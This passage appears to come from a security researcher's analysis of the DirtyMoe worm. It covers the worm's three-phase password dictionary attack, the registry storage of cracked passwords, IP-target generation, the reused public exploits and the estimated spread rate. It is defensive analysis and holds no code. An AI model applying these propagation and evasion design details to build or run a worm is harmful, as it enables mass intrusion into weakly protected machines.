<p class="has-normal-font-size">Cleverly, the module stores all previously successful passwords in the system registry; the first phase of the dictionary attack iterates through all stored passwords and uses these to attack the targeted system. Then, the attack series (SCMR, WMI, SQL) is started if the password is successfully guessed.</p>



<p class="has-normal-font-size">The second phase occurs if the stored registry passwords yield no success. The module then attempts authentication using a defined number of initial passwords from the password dictionary. This number is specified by the X1 configuration parameters (usually X1*100). If this phase is successful, the guessed password is stored in the system registry, and the attack series is initiated.</p>



<p class="has-normal-font-size">The final phase follows if the second phase is not successful. The module randomly chooses a password from a dictionary subset X2*100 times. The subset is defined as the original dictionary minus the first X1*100 items. In case of success, the attack series is invoked, and the password is added to the system registry.</p>



<p class="has-normal-font-size">Successfully used passwords are stored encrypted, in the following system registry location:<br><code>HKEY_LOCAL_MACHINE\Software\Microsoft\DirectPlay8\Direct3D\RegRunInfo-BarkIPsInfo</code></p>



<h4 class="wp-block-heading" id="Section7">7. Summary and Discussion</h4>



<h6 class="wp-block-heading" id="modules"><strong>Modules</strong></h6>



<p class="has-normal-font-size">We have detected three versions of the DirtyMoe worming module in use. Two versions specifically focus on the SMB service and MS SQL servers. However, the third contains several artifacts implying other attack vectors targeting PHP, Java Deserialization, and Oracle Weblogic Server. We continue to monitor and track these activities.</p>



<h6 class="wp-block-heading" id="attacked-machines"><strong>Attacked Machines</strong></h6>



<p class="has-normal-font-size">One interesting finding is an attack adaptation based on the geological location of the worming module. Methods described in <a href="#Section4">Section 4</a> try to distribute the generated IP addresses evenly to cover the largest possible radius. This is achieved using the IP address of the worming module itself since half of the threads generating the victim&#8217;s IPs are based on the module IP address. Otherwise, if the IP is not available for some reason, the IP address <kbd>98.126.89.1</kbd> located in Los Angeles is used as the base address.</p>



<p class="has-normal-font-size">We performed a few VPN experiments for the following locations: the United States, Russian Federation, Czech Republic, and Taiwan. The results are animated in <strong>Figure 17</strong>; <strong>Table 1</strong> records the attack distributions for each tested VPN.</p>

<h6 class="wp-block-heading" id="lan"><strong>LAN</strong></h6>



<p class="has-normal-font-size">Perhaps the most striking discovery was the observed lateral movement in local networks. The module keeps all successfully guessed passwords in the system registry; these saved passwords increase the probability of password guessing in local networks, particularly in home and small business networks. Therefore, if machines in a local network use the same weak passwords that can be easily assessed, the module can quickly infiltrate the local network.</p>



<h6 class="wp-block-heading" id="exploits"><strong>Exploits</strong></h6>



<p class="has-normal-font-size">All abused exploits are from publicly available resources. We have identified six main vulnerabilities summarized in <strong>Table 2</strong>. The worming module adopts the exact implementation of EternalBlue, ThinkPHP, and Oracle Weblogic Server exploits from <a href="https://www.exploit-db.com/" target="_blank" rel="noreferrer noopener">exploit-db</a>. In the same way, the module applies and modifies implementations of DoublePulsar, Tater, and PowerSploit frameworks.</p>

<h6 class="wp-block-heading" id="c-c-servers"><strong>C&amp;C Servers</strong></h6>



<p class="has-normal-font-size">The C&amp;C servers determine which module will be deployed on a victim machine. The mechanism of the worming module selection depends on client information additionally sent to the C&amp;C servers. However, details of how this module selection works remain to be discovered.</p>



<h6 class="wp-block-heading" id="password-dictionary"><strong>Password Dictionary</strong></h6>



<p class="has-normal-font-size">The password dictionary is a collection of the most commonly used passwords obtained from the internet. The dictionary size is 100,000 words and numbers across several topics and languages. There are several language mutations for the top world languages, e.g., English, Spanish, Portuguese, German, French, etc. (passwort, heslo, haslo, lozinka, parool, wachtwoord, jelszo, contrasena, motdepasse). Other topics are cars (volkswagen, fiat, hyundai, bugatti, ford) and art (davinci, vermeer, munch, michelangelo, vangogh). The dictionary also includes dirty words and some curious names of historical personalities like hitler, stalin, lenin, hussein, churchill, putin, etc.</p>



<p class="has-normal-font-size">The dictionary is used for SCMR, WMI, and SQL attacks. However, the SQL module hard-codes another 15 pairs of usernames/passwords also collected from the internet. The SQL passwords usually are default passwords of the most well-known systems.</p>



<h6 class="wp-block-heading" id="worming-workflow"><strong>Worming Workflow</strong></h6>



<p class="has-normal-font-size">The modules also implement a technique for repeated attacks on machines with &#8216;live&#8217; targeted ports, even when the first attack was unsuccessful. The attacks can be scheduled hourly or daily based on the worm configuration. This approach can prevent a firewall from blocking an attacking machine and reduce the risk of detection.</p>



<p class="has-normal-font-size">Another essential attribute is the closing of TCP port 445 port following a successful exploit of a targeted system. This way, compromised machines are &#8220;protected&#8221; from other malware that abuse the same vulnerabilities. The MSI installer also includes a mechanism to prevent overwriting DirtyMoe by itself so that the configuration and already downloaded modules are preserved.</p>



<h6 class="wp-block-heading" id="ip-generation-performance"><strong>IP Generation Performance</strong></h6>



<p class="has-normal-font-size">The primary key to this worm’s success is the performance of the IP generator. We have used empirical measurement to determine the performance of the worming module. This measurement indicates that one module instance can generate and attack 1,500 IPs per second on average. However, one of the tested instances could generate up to 6,000 IPs/sec, so one instance can try two million IPs per day.</p>



<p class="has-normal-font-size">The evidence suggests that approximately 1,900 instances can generate the whole IPv4 range in one day; our detections estimate more than 7,000 active instances exist in the wild. In theory, the effect is that DirtyMoe can generate and potentially target the entire IPv4 range three times a day.</p>



<h4 class="wp-block-heading" id="Section8">8. Conclusion</h4>



<p class="has-normal-font-size">The primary goal of this research was to analyze one of the DirtyMoe module groups, which provides the spreading of the DirtyMoe malware using worming techniques. The second aim of this study was to investigate the effects of worming and investigate which exploits are in use.&nbsp;</p>



<p class="has-normal-font-size">In most cases, DirtyMoe is deployed using external exploit kits like PurpleFox or injected installers of Telegram Messenger that require user interaction to successful infiltration. Importantly, worming is controlled by C&amp;C and executed by active DirtyMoe instances, so user interaction is not required.</p>



<p class="has-normal-font-size">Worming target IPs are generated utilizing the cleverly designed algorithm that evenly generates IP addresses across the world and in relation to the geological location of the worming module. Moreover, the module targets local/home networks. Because of this, public IPs and even private networks behind firewalls are at risk.</p>



<p class="has-normal-font-size">Victims&#8217; active machines are attacked using EternalBlue exploits and dictionary attacks aimed at SCMR, WMI, and MS SQL services with weak passwords. Additionally, we have detected a total of six vulnerabilities abused by the worming module that implement publicly disclosed exploits.</p>



<p class="has-normal-font-size">We also discovered one worming module in development containing other vulnerability exploit implementations &#8211; it did not appear to be fully armed for deployment. However, there is a chance that tested exploits are already implemented and are spreading in the wild.&nbsp;</p>



<p class="has-normal-font-size">Based on the amount of active DirtyMoe instances, it can be argued that worming can threaten hundreds of thousands of computers per day. Furthermore, new vulnerabilities, such as Log4j, provide a tremendous and powerful opportunity to implement a new worming module. With this in mind, our researchers continue to monitor the worming activities and hunt for other worming modules.</p>
